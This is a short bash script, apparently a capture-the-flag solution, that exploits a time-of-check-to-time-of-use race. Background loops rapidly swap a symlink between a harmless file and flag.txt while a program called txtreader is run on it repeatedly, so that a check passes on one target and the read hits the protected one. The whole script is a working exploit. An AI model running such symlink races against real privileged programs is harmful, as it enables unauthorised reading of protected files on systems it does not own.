#!/bin/bash
while true; do ln -sf ./file flip; done & 
while true; do ln -sf ./flag.txt flip; done &

for i in {1..300}; do ./txtreader flip 2>/dev/null; done
